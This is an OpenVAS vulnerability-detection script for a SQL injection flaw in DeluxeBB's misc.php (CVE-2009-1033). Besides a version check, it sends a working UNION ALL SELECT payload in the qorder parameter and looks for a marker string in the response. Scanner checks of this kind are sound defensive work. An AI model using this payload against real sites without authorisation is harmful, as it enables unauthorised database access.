###############################################################################
# OpenVAS Vulnerability Test
#
# DeluxeBB 'misc.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:deluxebb:deluxebb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100064");
  script_version("2019-05-17T10:45:27+0000");
  script_tag(name:"last_modification", value:"2019-05-17 10:45:27 +0000 (Fri, 17 May 2019)");
  script_tag(name:"creation_date", value:"2009-03-20 11:01:53 +0100 (Fri, 20 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1033");
  script_bugtraq_id(34174);
  script_name("DeluxeBB 'misc.php' SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("deluxeBB_detect.nasl");
  script_mandatory_keys("deluxebb/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34174");
  script_xref(name:"URL", value:"http://www.deluxebb.com/");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"DeluxeBB is prone to an SQL-injection vulnerability because it fails to
  sufficiently sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit
  latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"DeluxeBB 1.3 and earlier versions are vulnerable.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if(!infos = get_app_version_and_location(cpe: CPE, port: port, exit_no_version: FALSE)) exit(0);
version = infos['version'];
dir = infos['location'];
if (dir == "/")
  dir = "";

if (version_is_less_equal(version: version, test_version: "1.3")) {
  report = report_fixed_ver(installed_version: version, fixed_version: "WillNotFix");
  security_message(port: port, data: report);
  exit(0);
} else {
  url = dir + "/misc.php?sub=memberlist&order=1&qorder=UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,0x53514c2d496e6a656374696f6e2d54657374,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23&sort=ASC&filter=all&searchuser=.&submit=1";
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if(!buf) exit(0);

  if (egrep(pattern: "SQL-Injection-Test", string: buf)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
